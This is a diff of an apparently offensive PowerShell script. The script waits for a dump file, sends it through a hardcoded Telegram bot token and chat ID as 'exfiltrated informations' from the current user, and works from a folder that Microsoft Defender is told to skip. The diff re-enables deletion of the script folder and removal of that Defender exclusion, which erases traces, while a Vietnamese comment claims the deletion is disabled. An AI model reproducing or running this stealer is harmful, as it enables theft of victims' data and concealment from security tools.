@@ -60,7 +60,6 @@ while (!(Test-Path "$dumpFile")) {
 
 # Telegram configuration
 $token = "8671014944:AAEfUUYGPdYuhVHYdBKq1EFqoNLbPMS99QQ"
-# $chatID = "8671014944"
 $chatID = "8688296089"
 $uri = "https://api.telegram.org/bot$token/sendDocument"
 $caption = "Here are exfiltrated informations from $env:USERNAME"
@@ -123,8 +122,8 @@ Set-Location C:\Users\Public\Documents
 # ===============================================================================
 # [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
 # ===============================================================================
-# Remove-Item -Recurse -Force scripts
-# Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
+Remove-Item -Recurse -Force scripts
+Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
 # ===============================================================================
 
 # Caps Lock signal
